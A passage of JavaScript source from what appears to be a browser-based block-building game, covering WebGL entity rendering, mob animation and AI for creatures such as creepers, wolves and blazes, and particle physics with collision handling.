      this.targetY = y
      this.targetZ = z
			this.velx = vx
			this.vely = vy
			this.velz = vz
			this.lastPos = performance.now()
    }
    setRot(rx,ry, bodyRot){
      this.targetRx = rx
      this.targetRy = ry
      this.bodyRot = (bodyRot || bodyRot === 0) ? bodyRot : ry
    }
    render(){
      totalEntites++
      if(this.hidden) return
			if(performFast && !p.thirdPerson && (this === p.spectating || this === p)) return
      renderedEntities++
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = (this.y - this.previousY) * diff + this.previousY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      if(!this.swimming) rendery += this.offsetY
      
      let offsetry = lerp(diff, this.pOffsetry, this.offsetry)
      
      //set texture to skin
      gl.activeTexture(gl.TEXTURE7)
      gl.bindTexture(gl.TEXTURE_2D, this.skinTex)
      
			const modelMatrix = entityMatrices.modelMatrix
			const viewMatrix = p.camera.transformation.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 7)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
      gl.uniform1f(glCache.harmEffectEntity, this.harmEffect || this.dieEffect)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			for(var part in this.parts){
        this.renderPart(this.parts[part], modelMatrix, modelViewProjectionMatrix, projectionMatrix, viewMatrix, renderx, rendery, renderz)
      }
      gl.uniform1f(glCache.harmEffectEntity, 0)
      if(this.burning){
        entityFire.render(this)
      }
      if(this.nameText && !this.sneaking && (p.thirdPerson || this !== p.spectating && this !== p)) this.nameText.render()
    }
    renderPart(part, modelMatrix, modelViewProjectionMatrix, projectionMatrix, viewMatrix, x,y,z){
      if(part.name === "cape"){
        if(!this.capeTex) return
        gl.activeTexture(gl.TEXTURE7)
        gl.bindTexture(gl.TEXTURE_2D, this.capeTex)
      }
      var texAtlas = part.name === "holding"
      if(texAtlas){
        gl.uniform1i(glCache.uSamplerEntity, 0)
      }
      
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      let partDiff = (now - part.lastUpdate) / tickTime
			if (partDiff > 1) partDiff = 1
      let yaw = lerp(diff,this.previousYaw,this.yaw)
      let pitch = lerp(diff,this.previousPitch,this.pitch)
      
      modelMatrix.identity()
      modelMatrix.translate(x, y, z)
      modelMatrix.rotY(yaw)
      modelMatrix.rotX(pitch)
			modelMatrix.scale(this.scale*this.actualSize,this.scale*this.actualSize,this.scale*this.actualSize)
			if(this.dieRotate){
				modelMatrix.translate(0,-this.height/2,0)
				modelMatrix.rotZ(this.dieRotate)
				modelMatrix.translate(0,this.height/2,0)
			}
      modelMatrix.translate(0,0,lerp(diff,this.pOffsetZ,this.offsetZ))
      if(this.swimming) modelMatrix.translate(0, this.offsetY, 0)
      if(part.name === "holding"){
        var arm = this.parts.rightArm
        modelMatrix.translate(arm.x, arm.y, arm.z)
        modelMatrix.rotZ(lerp(partDiff,arm.prz,arm.rz))
        if(arm.ry2) modelMatrix.rotY(lerp(partDiff,arm.pry2,arm.ry2))
        modelMatrix.rotX(lerp(partDiff,arm.prx,arm.rx))
        modelMatrix.rotY(lerp(partDiff,arm.pry,arm.ry))
      }
			modelMatrix.translate(part.x, part.y, part.z)
      if(part.name === "head"){
        modelMatrix.rotX(-pitch)
        modelMatrix.rotY(-yaw)
      }
      modelMatrix.rotZ(lerp(partDiff,part.prz,part.rz))
      if(part.ry2) modelMatrix.rotY(lerp(diff,part.pry2,part.ry2))
			modelMatrix.rotX(lerp(partDiff,part.prx,part.rx))
			modelMatrix.rotY(lerp(partDiff,part.pry,part.ry))
			modelMatrix.scale(part.w, part.h, part.d)
      
      modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
      modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
      
      if(part.tint){
        gl.uniform3f(glCache.tintEntity, part.tint[0],part.tint[1],part.tint[2])
        gl.uniform1i(glCache.tintGrayEntity, 1)
      }
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(part.vao)
			gl.drawElements(gl.TRIANGLES, 6 * part.size, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      if(part.tint){
        gl.uniform3f(glCache.tintEntity, 1,1,1)
        gl.uniform1i(glCache.tintGrayEntity, 0)
      }
      
      if(texAtlas){
        gl.uniform1i(glCache.uSamplerEntity, 7)
      }
    }
  }
  window.Player = Player
  
  class Mob extends Entity{
		static mob = true
		mob = true
		pushes = true
    constructor(){
			super(...arguments)
      /*this.moveTime = 0
      this.spinTime = 0
      this.spin = 0
      this.dirx = 0
      this.dirz = 0*/
      this.health = 0
			this.path = null
			this.walking = false
			this.panick = 0
			this.drop = null
			this.dropAmount = 0
			this.burnTimer = 0
			this.burning = false
			this.oxygen = 20
			this.spinTarget = 0
			this.spinTargetPitch = 0
			this.die = false
			this.lastDamage = 0
			this.lastStepSound = 0
			this.noScale = true
			this.target = null, this.targetEnt = null
			this.attackCooldown = 0
			this.attractEnt = null, this.attractedBy = null
			this.holding = this.prevHolding = 0
			this.canClimb = false
			this.canFly = false
			this.sitting = false
			this.owner = null
			this.name = null
			this.effects = {}
			this.doInterpolate = true
			this.offsetry = Math.PI
    }
    mobUpdate(now) {
      this.maxBurnBlock = this.maxDamageBlock = 0
			this.updateVelocity(now)
			this.move(now)
			this.walking = this.path && this.path.length ? true : false
			if(this.panick > 0) this.panick--
			if(this.previousYaw - this.yaw > Math.PI) this.previousYaw += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
			if(this.previousYaw - this.yaw < -Math.PI) this.previousYaw -= Math.PId
			this.targetEnt = this.target && getEntityOrPlayer(this.target)
			this.attractEnt = this.attractedBy && getEntityOrPlayer(this.attractedBy)
			
      if(this.wet && this.burnTimer > 0) {
        this.burnTimer = 0
        poof(this.x,this.y-this.height/2+0.25,this.z, 8, this.dimension, this.width,0,this.depth, true)
      }
      this.burning = this.burnTimer > 0
			if(this.harmEffect > 0){
				this.harmEffect -= 3
			}
			if(this.health < 0) this.health = 0
      if(this.health <= 0 && !this.die){
        this.die = true
      }
      if(this.die){
        this.dieEffect += 0.05
        this.dieRotate = (this.dieEffect**4)*Math.PI2
				if(this.dieEffect > 1){
					this.dieEffect = 0
					this.dieRotate = 0
					this.hidden = true
				}
      }
			if(this.prevHolding !== this.holding){
				this.prevHolding = this.holding
				if(this.updateHolding) this.updateHolding()
			}
			if(this.prevName !== this.name){
				this.prevName = this.name
				if(this.name){
					if(!this.nameText){
						this.nameText = world.generateTextForEntity(this.name,this,1/4, null,[0,0,0,0.7])
					}else this.nameText.setText(this.name)
				}else{
					this.nameText = null
				}
			}
			if(this.nameText){
				this.nameText.update()
        this.nameText.dimension = this.dimension
        this.nameText.x = this.x
        this.nameText.y = this.y+this.height/2+0.25
        this.nameText.z = this.z
			}
		}
		walkStart = 0
		prevWalking = false
		walkRot = 0
		update(){
      this.mobUpdate(now)

      if(this.prevWalking !== this.walking){
        this.prevWalking = this.walking
        this.walkStart = now
      }
      var walkRotTarget = 0
      if(this.walking){
        if(this.panick > 0) walkRotTarget = sin(((now - this.walkStart) / 500) * Math.PI) * Math.PI / 4
        else walkRotTarget = sin(((now - this.walkStart) / 1000) * Math.PI) * Math.PI / 4
      }
      this.walkRot = lerp(0.5,this.walkRot,walkRotTarget)
      if(this.parts.leg0) this.parts.leg0.rx = -this.walkRot
      if(this.parts.leg2) this.parts.leg2.rx = this.walkRot
      if(this.parts.leg1) this.parts.leg1.rx = this.walkRot
      if(this.parts.leg3) this.parts.leg3.rx = -this.walkRot
      if(this.parts.leftleg) this.parts.leftleg.rx = this.walkRot
      if(this.parts.rightleg) this.parts.rightleg.rx = -this.walkRot
      if(this.parts.leftLeg) this.parts.leftLeg.rx = this.walkRot
      if(this.parts.rightLeg) this.parts.rightLeg.rx = -this.walkRot

			if(this.parts.head){
				if(this.targetEnt || this.attractEnt){
					let {x,y,z} = this.targetEnt || this.attractEnt
					let yaw = angleOf(x,z,this.x,this.z)
					this.parts.head.ry2 = -(this.yaw - yaw)
					if(this.parts.head.ry2 - this.parts.head.pry2 > Math.PI) this.parts.head.pry2 += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
					if(this.parts.head.ry2 - this.parts.head.pry2 < -Math.PI) this.parts.head.pry2 -= Math.PId
					let adjacent = dist2(this.x,this.z,x,z)
					this.parts.head.rx = Math.PId - atan2(y - (this.y+this.parts.head.y), adjacent)
					this.parts.head.ry = 0
				}else if(this.path){
					let i = this.path.length - 3
					let x = this.path[i], y = this.path[i+1], z = this.path[i+2]
					let yaw = angleOf(x,z,this.x,this.z)
					this.parts.head.ry = -(this.yaw - yaw)
					if(this.parts.head.ry - this.parts.head.pry > Math.PI) this.parts.head.pry += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
					if(this.parts.head.ry - this.parts.head.pry < -Math.PI) this.parts.head.pry -= Math.PId
					this.parts.head.rx = this.parts.head.ry2 = 0
				}else if(this.spinTarget){
					let yaw = this.spinTarget
					this.parts.head.ry = -(this.yaw - yaw)
					if(this.parts.head.ry - this.parts.head.pry > Math.PI) this.parts.head.pry += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
					if(this.parts.head.ry - this.parts.head.pry < -Math.PI) this.parts.head.pry -= Math.PId
					this.parts.head.rx = this.parts.head.ry2 = 0
				}
			}
			if(this.additionalUpdate) this.additionalUpdate()
		}
    /*onhit(damage,remote, vx,vz, from){
      if(!remote) send({
        type:"entEvent",event:"damageMob",id:this.id,
        data:{damage, vx,vz, from}
      })
      this.panick = 60
      this.sitting = false

			let prev = damage
			if(this.harmEffect > 0){
				if(damage > this.lastDamage){
					damage -= this.lastDamage
				}else return
			}
			
			this.health -= damage
			this.harmEffect = 30
			this.lastDamage = prev
    }*/
  }
  
	let entityDataAdditional = {
		creeper:{
			additionalUpdateClient(){
				let d = this.targetEnt && max(abs(this.targetEnt.x-this.x),abs(this.targetEnt.y-this.y),abs(this.targetEnt.z-this.z))
				if(this.targetEnt && d<=3){
					if(!this.explodeAmount){
						this.timerStart = now
					}
					this.explodeAmount++
					if(this.explodeAmount > 20) this.explodeAmount = 20
				}else if(this.explodeAmount) this.explodeAmount--
				this.shader = 0, this.extraSize = 0
				if(this.explodeAmount>0){
					var i = Math.floor((now - this.timerStart) / 125)
					if(!(i%2)){
						this.shader = 1
					}
					if((now - this.timerStart) / tickTime >= this.timeLimit - 10){
						//get bigger
						this.extraSize = min(-((this.timeLimit - 10) - ((now - this.timerStart) / tickTime)) / 40,0.25)
						this.shader = 1
					}
				}
			}
		},//todo n: tint sheep
		sheep:{
			additionalUpdateClient(){
				if(this.eating){
					if(this.parts.head.y > this.parts.head.originalY - 0.5){
						this.parts.head.y -= 0.05
					}else{
						this.parts.head.rx = (sin(((now - this.spawn) / 250) * Math.PI) * Math.PI / 8)+Math.PI4
					}
				}else if(this.parts.head.y < this.parts.head.originalY){
					this.parts.head.y += 0.05
					this.parts.head.rx = 0
					if(this.parts.head.y > this.parts.head.originalY) this.parts.head.y = this.parts.head.originalY
				}
				if(this.fur !== this.prevFur){
					this.prevFur = this.fur
					this.setPartShapes(this.fur ? this.variantsBones.default : this.variantsBones.sheared)
				}
				this.tint = this.color
			}
		},
		chicken:{
			additionalUpdateClient(){
				if(this.vely < 0 || this.liquid){
					let rot = sin(((now - this.walkStart) / 125) * Math.PI) * Math.PI / 4 + Math.PI2
					this.parts.leftWing.rz = rot
					this.parts.rightWing.rz = -rot
				}else{
					this.parts.leftWing.rz = this.parts.rightWing.rz = 0
				}
			}
		},
		zombie:{
			additionalUpdateClient(){
				if(!this.liquid && this.world.getLight(round(this.x), round(this.y), round(this.z), 0, this.dimension)*skyLight > 11){
					this.burnTimer += 0.2
				}
			}
		},
		skeleton:{
			updateHolding(){//todo n: update holding
				let part = this.parts.holding
				let v = generateBlockVAO(this.holding)
				part.vao = v.vao
				part.size = v.size
				let pix = 1 / 16
				if(blockData[this.holding].tool){
					part.x = 0
					part.y = pix*-12
					part.z = pix*6
					part.w = part.h = part.d = 1
					part.rx = Math.PI / 1.25
					part.ry = Math.PI * -0.5
				}else if(blockData[this.holding].name === "bow"){
					part.x = 0
					part.y = pix*-12
					part.z = 0
					part.w = part.h = part.d = 1
					part.rx = Math.PI / 1.25
					part.ry = Math.PI * -0.5
				}else if(blockData[this.holding].spyglass){
					part.x = pix*2
					part.y = pix*-10
					part.z = 0
					part.w = part.h = part.d = 1
					part.rx = -this.holdRot
					part.ry = 0
				}else if(blockData[this.holding].item){
					part.x = 0
					part.y = pix*-11
					part.z = pix*4
					part.w = part.h = part.d = 0.5
					part.rx = Math.PI2
					part.ry = 0
				}else if(this.holding){
					part.x = 0
					part.y = pix*-12
					part.z = pix*3
					part.w = part.h = part.d = 0.25
					part.rx = 0
					part.ry = Math.PI / 4
				}else{
					this.parts.rightArm.rx = 0
				}
			},
			additionalUpdateClient(){
				if(!this.liquid && this.world.getLight(round(this.x), round(this.y), round(this.z), 0, this.dimension)*skyLight > 11){
					this.burnTimer += 0.2
				}
			}
		},//todo n: spider animat, wolf
		wolf:{
			additionalUpdateClient(){
				if(this.sitting){
					this.offsetY = this.defaultOffsetY - pix*3
					this.parts.collar.rx = this.pitch2 = -Math.PI4
					this.parts.frontLeftLeg.rx = -Math.PI/8
					this.parts.frontRightLeg.rx = -Math.PI/8
					this.parts.backLeftLeg.rx = -Math.PI2
					this.parts.backRightLeg.rx = -Math.PI2
					this.parts.tail.y = this.parts.tail.originalY-pix*4
					this.parts.tail.z = this.parts.tail.originalZ+pix*2
					this.parts.frontLeftLeg.y = this.parts.frontLeftLeg.originalY+pix*3
					this.parts.frontRightLeg.y = this.parts.frontRightLeg.originalY+pix*3
					this.parts.backLeftLeg.y = this.parts.backLeftLeg.originalY-pix*4
					this.parts.backRightLeg.y = this.parts.backRightLeg.originalY-pix*4
					this.parts.head.y = this.parts.head.originalY+pix*6
					this.parts.head.z = this.parts.head.originalZ-pix*3
				}else{
					this.offsetY = this.defaultOffsetY
					this.parts.collar.rx = this.pitch2 = 0
					this.parts.frontLeftLeg.rx = this.walkRot
					this.parts.frontRightLeg.rx = -this.walkRot
					this.parts.backLeftLeg.rx = this.walkRot
					this.parts.backRightLeg.rx = -this.walkRot
					this.parts.tail.y = this.parts.tail.originalY
					this.parts.tail.z = this.parts.tail.originalZ
					this.parts.frontLeftLeg.y = this.parts.frontLeftLeg.originalY
					this.parts.frontRightLeg.y = this.parts.frontRightLeg.originalY
					this.parts.backLeftLeg.y = this.parts.backLeftLeg.originalY
					this.parts.backRightLeg.y = this.parts.backRightLeg.originalY
					this.parts.head.y = this.parts.head.originalY
					this.parts.head.z = this.parts.head.originalZ
				}
				this.parts.tail.rx = this.target ? Math.PI2 : this.health/20*Math.PI
				if(this.prevTarget !== this.target || this.prevTame !== this.tame){
					this.prevTarget = this.target
					this.prevTame = this.tame
					this.updateShape()
				}
				if(this.wet) this.wetStuff = 40
				else if(this.wetStuff){
					this.wetStuff--
					this.roll = sin(this.wetStuff/2*Math.PI)*Math.PI4*this.wetStuff/40
					this.parts.head.rz = sin(this.wetStuff+0.5/2*Math.PI)*Math.PI4*this.wetStuff/40
					if(!performFast) world.addParticle(new entities[entityIds.SplashParticle](this.x+rand(-0.5,0.5),this.y+0.5,this.z+rand(-0.5,0.5)),this.dimension)
				}
				if(this.wet || !this.wetStuff){
					this.roll = this.parts.head.rz = 0
				}
			}
		},
		blaze:{
			putThingy(layer,n,speed,size){
				let part = this.parts["thingy"+layer+"_"+n]
				let where = (now-this.spawn)/speed+n/2
				part.x = sin(where*Math.PI)*size
				part.z = cos(where*Math.PI)*size
			},
			additionalUpdateClient(){
				if(this.burnTimer) this.burnTimer = 0

				this.putThingy(1,0,1000,0.5)
				this.putThingy(1,1,1000,0.5)
				this.putThingy(1,2,1000,0.5)
				this.putThingy(1,3,1000,0.5)
				this.putThingy(2,0,-750,0.375)
				this.putThingy(2,1,-750,0.375)
				this.putThingy(2,2,-750,0.375)
				this.putThingy(2,3,-750,0.375)
				this.putThingy(3,0,500,0.25)
				this.putThingy(3,1,500,0.25)
				this.putThingy(3,2,500,0.25)
				this.putThingy(3,3,500,0.25)
			}
		}
	}

	let entityData = win.entityData
	for(let i=0; i<entityData.length; i++){
		let data = entityData[i]
		let ent = class extends Mob {
			static name2 = data.name
			constructor(x,y,z){
				super(x,y,z,0,0,0,0,0, data.width,data.height,data.depth, null,null,null, 300000)
				if(this.onspawn) this.onspawn()
				this.setPartShapes(data.variantsBones.default)
			}
		}
		Object.assign(ent.prototype, data)
		if(entityDataAdditional[data.name]) Object.assign(ent.prototype, entityDataAdditional[data.name])
		entities[entities.length] = ent
	}

	/*entities[entities.length] = class EnderDragon extends Mob{
		static name2 = "EnderDragon"
		defaultName = "Ender Dragon"
    constructor(x,y,z){
      let tex = textureCoords[textureMap.blank]
      let vao = generateVAO(shapes.enderDragonBody, tex[0],tex[1],tex[2]-tex[0],tex[5]-tex[1])
      let pix = 1/16
      super(x, y, z, 0, 0, 0, 0, 0, 16, 36*pix, 16, null,null, vao.size, 300000, vao.vao)
			this.offsetY = pix*4
			let part = generateVAO(shapes.enderDragonNeck,tex[0],tex[1],tex[2]-tex[0],tex[5]-tex[1])
			for(let i=0;i<6;i++){
				const s = 0.5-i/24+0.25
				this.addPart("neck"+i,part.size,part.vao,0,0,i ? s : pix*36,s,s,s,-0.05,0,0,i?"neck"+(i-1):undefined)
			}
			part = generateVAO(shapes.enderDragonTail,tex[0],tex[1],tex[2]-tex[0],tex[5]-tex[1])
			for(let i=0;i<12;i++){
				const s = (1-i/16)*0.75
				const l = 1-(i/16)**2
				this.addPart("tail"+i,part.size,part.vao,0,0,i ? -l : pix*-36,s,s,l,0.05,0,0,i?"tail"+(i-1):undefined)
			}
      part = generateVAO(shapes.enderDragonHead,tex[0],tex[1],tex[2]-tex[0],tex[5]-tex[1])
      this.addPart("head",part.size,part.vao,0,0,0.5,1,1,1,0,0,0,"neck5")
			part = generateVAO(shapes.enderDragonMouthBottom,tex[0],tex[1],tex[2]-tex[0],tex[5]-tex[1])
      this.addPart("mouthBottom",part.size,part.vao,0,pix*-4,pix*8,1,1,1,0,0,0,"head")
      
      this.health = 100
      this.prevWalking = false
      this.walkStart = 0
      this.walkRot = 0
			this.hostile = true
      this.minFollowDist = 1
      this.maxFollowDist = 35
			this.detectionDist = 17.5
			this.attackStrength = 3
			this.maxAttackCooldown = 20
    }
		killMessage(username){return username+" died from the Ender Dragon."}
    update(){return
      this.mobUpdate(now)

      if(this.prevWalking !== this.walking){
        this.prevWalking = this.walking
        this.walkStart = now
      }
      var walkRotTarget = 0
      if(this.walking){
        if(this.panick > 0) walkRotTarget = sin(((now - this.walkStart) / 500) * Math.PI) * Math.PI / 4
        else walkRotTarget = sin(((now - this.walkStart) / 1000) * Math.PI) * Math.PI / 4
      }
      this.walkRot = lerp(0.5,this.walkRot,walkRotTarget)
      this.parts.leftLeg.rx = this.walkRot
      this.parts.rightLeg.rx = -this.walkRot
      let pix = 1 / 16
      let armRot = (sin((now - this.spawn) / 1000) / 2 + 0.5) * Math.PI / 40
			this.parts.leftArm.rz = armRot
			this.parts.rightArm.rz = -armRot
			this.parts.leftArm.rx = this.walkRot
      this.parts.rightArm.rx = -this.walkRot
			if(this.targetEnt){
				let offset = -(10-abs(this.attackCooldown-10))*Math.PI4/10
				this.parts.leftArm.rx = -Math.PI2+offset
				this.parts.rightArm.rx = -Math.PI2+offset
			}else{
				this.parts.leftArm.rx = this.walkRot
				this.parts.rightArm.rx = -this.walkRot
			}
      if(this.targetEnt){
        let {x,y,z} = this.targetEnt
        let yaw = angleOf(x,z,this.x,this.z)
        this.parts.head.ry2 = -(this.yaw - yaw)
        if(this.parts.head.ry2 - this.parts.head.pry2 > Math.PI) this.parts.head.pry2 += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
        if(this.parts.head.ry2 - this.parts.head.pry2 < -Math.PI) this.parts.head.pry2 -= Math.PId
        let adjacent = dist2(this.x,this.z,x,z)
        this.parts.head.rx = Math.PId - atan2(y - (this.y+this.parts.head.y), adjacent)
				this.parts.head.ry = 0
      }else if(this.path){
        let i = this.path.length - 3
        let x = this.path[i], y = this.path[i+1], z = this.path[i+2]
        let yaw = angleOf(x,z,this.x,this.z)
        this.parts.head.ry = -(this.yaw - yaw)
        if(this.parts.head.ry - this.parts.head.pry > Math.PI) this.parts.head.pry += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
        if(this.parts.head.ry - this.parts.head.pry < -Math.PI) this.parts.head.pry -= Math.PId
        this.parts.head.rx = this.parts.head.ry2 = 0
      }else if(this.spinTarget){
        let yaw = this.spinTarget
        this.parts.head.ry = -(this.yaw - yaw)
        if(this.parts.head.ry - this.parts.head.pry > Math.PI) this.parts.head.pry += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
        if(this.parts.head.ry - this.parts.head.pry < -Math.PI) this.parts.head.pry -= Math.PId
        this.parts.head.rx = this.parts.head.ry2 = 0
      }
    }
  }*/
  
  class Particle extends Entity{
		constructor() {
			super(...arguments)
      this.tint = null
      this.tintGray = false
			this.gravityStength = -0.08
			this.drag = 0.9
		}
    /*facePlayer(){
      this.yaw = Math.PId - (atan2(p.z - this.z, p.x - this.x) + Math.PI2 + Math.PI)
      var adjacent = dist2(this.x,this.z,p.x,p.z)
      this.pitch = Math.PId - atan2(p.y - this.y, adjacent)
      
      /* //var magnitude = dist3(this.x,this.y,this.z,p.x,p.y,p.z)
      this.yaw = atan2(p.z - this.z, p.x-this.x)
      var adjacent = dist2(this.x,this.z,p.x,p.z)
      this.pitch = atan2(p.y - this.y, adjacent)* /
      
      /*var r = this.rotationMatrix
      r.identity()
      var e = r.elements
      var up = vec4
      up.x = 0
      up.y = 1
      up.z = 0
      e[12] = this.x
      e[13] = this.y
      e[14] = this.z
      var z = vec1
      z.x = this.x - p.x
      z.y = this.y - p.y
      z.z = this.z - p.z
      z.normalize()
      var x = up.crossProduct(z.x,z.y,z.z, vec2)
      x.normalize()
      var y = z.crossProduct(x.x,x.y,x.z, vec3)
      y.normalize()
      e[0] = x.x
      e[1] = x.y
      e[2] = x.z
      e[4] = y.x
      e[5] = y.y
      e[6] = y.z
      e[8] = z.x
      e[9] = z.y
      e[10] = z.z* /
      
      /* /less code, more computing
      var dx = p.x-this.x;
      var dy = p.y-this.y;
      var dz = p.z-this.z;
      var rxy = Math.sqrt( Math.pow(dx,2) + Math.pow(dy,2) );
      var lambda = Math.atan(dy/dx);
      var phi = Math.atan(dz/rxy)
      if (dx < 0) phi = phi + Math.PI;
      if (dz < 0) lambda = -1 * lambda;
      this.pitch = rxy
      this.yaw = lambda* /
    }*/
		
		updateVelocity(now) {
      this.standingOn = this.world.getBlock(round(this.x), floor(this.y-this.height/2), round(this.z), this.dimension)
      this.insideBlock = this.world.getBlock(round(this.x),round(this.y),round(this.z), this.dimension)
      this.vely += this.gravityStength
			let drag = this.liquid && !this.canFloat ? this.drag*0.6222222222222222 : (this.onGround ? this.drag*0.888888888888889 : this.drag)
			let yDrag = this.liquid ? this.drag*0.3333333333333333 : this.drag*0.888888888888889
      if(blockData[this.standingOn].slide) drag = blockData[this.standingOn].slide
			this.velz += (this.velz * drag - this.velz)
			this.velx += (this.velx * drag - this.velx)
			this.vely += (this.vely * yDrag - this.vely)
		}
		move(now) {
      let steps = Math.ceil(max(abs(this.velx / (this.width/2)), abs(this.vely / (this.height/2)), abs(this.velz / (this.depth/2)), 1))
      const VX = this.velx / steps
      const VY = this.vely / steps
      const VZ = this.velz / steps
      
			let pminX = floor(this.x - this.width / 2)
			let pmaxX = ceil(this.x + this.width / 2)
			let pminY = floor(this.y - this.height / 2)
			let pmaxY = ceil(this.y + this.height / 2)
			let pminZ = floor(this.z - this.depth / 2)
			let pmaxZ = ceil(this.z + this.depth / 2)
			let block = null

      this.liquid = this.wet = false
			for (let x = pminX; x <= pmaxX; x++) {
				for (let y = pminY; y <= pmaxY; y++) {
					for (let z = pminZ; z <= pmaxZ; z++) {
						let block = this.world.getBlock(x, y, z, this.dimension)
						if (block && blockData[block].solid && !blockData[block].liquid) {
							this.contacts.add(x, y, z, block)
						}
            if(x === round(this.x) && z === round(this.z) && blockData[block].liquid){
              this.liquid = true
              if(this.canFloat && x === round(this.x) && z === round(this.z) && y === round(this.y)){
                this.vely+=1/4
              }
              if(blockData[block].wet) this.wet = true
            }
            if(blockData[block].getCurrent){
              var me = blockData[block]
              var c = me.getCurrent(x,y,z,undefined,undefined,this.world)
              this.velx += (c.x||0)/64
              this.velz += (c.z||0)/64
              var under = this.world.getBlock(x,y-1,z,this.dimension)
              if(me.isThis(under) && under !== me.id) this.vely -= 1/128
            }
					}
				}
			}
			this.world.getEntitiesNear(this.x,this.y,this.z,this.dimension, ceil(max(this.width/2,this.height/2,this.depth/2)), nearEntityArray)
      for(let i = 0; i < nearEntityArray.length; i++) {
        var e = nearEntityArray[i]
        if(e.canStandOn && e.block && e.x > pminX && e.x < pmaxX && e.y > pminY && e.y < pmaxY && e.z > pminZ && e.z < pmaxZ) {
          this.contacts.add(e.x, e.y, e.z, e.block, e)
        }
      }
			if(weather === "rain" && weatherAmount > 0.5){
				let top = world.getSolidTop(round(this.x),round(this.z),this.dimension)
				if(this.y > top) this.wet = true
			}

			this.previousX = this.x
			this.previousY = this.y
			this.previousZ = this.z
      this.previousPitch = this.pitch
      this.previousYaw = this.yaw
      this.previousRoll = this.roll
			this.previousPitch2 = this.pitch2
      this.prevOffsetY = this.offsetY
      this.hasCollided = false
      for(let part in this.parts){
        this.parts[part].prx = this.parts[part].rx
        this.parts[part].pry = this.parts[part].ry
        this.parts[part].prz = this.parts[part].rz
        this.parts[part].pry2 = this.parts[part].ry2
      }

      for (let j = 1; j <= steps && !this.hasCollided; j++) {
        let px = this.x, pz = this.z, py = this.y
        
        this.canStepX = false
        this.canStepY = false
        this.onGround = false
        //Check collisions in the Y direction
        this.y += VY
        for (let i = 0; i < this.contacts.size; i++) {
          block = this.contacts.array[i]
          let x = block[0], y = block[1], z = block[2], vy = VY
          if(block[4]){
            x = block[4].previousX
            z = block[4].previousZ
            vy -= (block[4].y-block[4].previousY)/steps
          }
          if (this.collided(x, y, z, null, vy, null, block[3])) {
            this.hasCollided = true
            //break
          }
        }

        if (this.onGround) {
          this.canStepX = true
          this.canStepZ = true
        }

        //Check collisions in the X direction
        this.x += VX
        for (let i = 0; i < this.contacts.size; i++) {
          block = this.contacts.array[i]
          let x = block[0], y = block[1], z = block[2], vx = VX
          if(block[4]){
            z = block[4].previousZ
            vx -= (block[4].x-block[4].previousX)/steps
          }
          if (this.collided(x, y, z, vx, null, null, block[3])) {
            if (this.canStepX && !this.world.getBlock(block[0], block[1] + 1, block[2], this.dimension) && !this.world.getBlock(block[0], block[1] + 2, block[2]), this.dimension) {
              continue
            }
            this.hasCollided = true
            //break
          }
        }

        //Check collisions in the Z direction
        this.z += VZ
        for (let i = 0; i < this.contacts.size; i++) {
          block = this.contacts.array[i]
          let x = block[0], y = block[1], z = block[2], vz = VZ
          if(block[4]){
            vz -= (block[4].z-block[4].previousZ)/steps
          }
          if (this.collided(x, y, z, null, null, vz, block[3])) {
            if (this.canStepZ && !this.world.getBlock(block[0], block[1] + 1, block[2], this.dimension) && !this.world.getBlock(block[0], block[1] + 2, block[2], this.dimension)) {
              continue
            }
            this.hasCollided = true
            //break
          }
        }
      }
      
      if(this.onGround){
        this.hasCollided = true
      }
			this.lastUpdate = now
			this.contacts.clear()
		}
		update() {
			this.updateVelocity(now)
			this.move(now)
			if (now - this.spawn > this.despawns) {
				this.canDespawn = true
			}
      
      this.canFacePlayer = true
		}
		render() {
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width,this.height,this.depth)) return
      renderedEntities++

      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = (this.y - this.previousY) * diff + this.previousY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
      if(this.canFacePlayer){
        this.facePlayer()
        this.canFacePlayer = false
      }
      
			const offsetY = this.offsetY
			const modelMatrix = new Matrix();
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery + offsetY, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width, this.height, this.depth)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const modelViewProjectionMatrix = new Matrix()
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
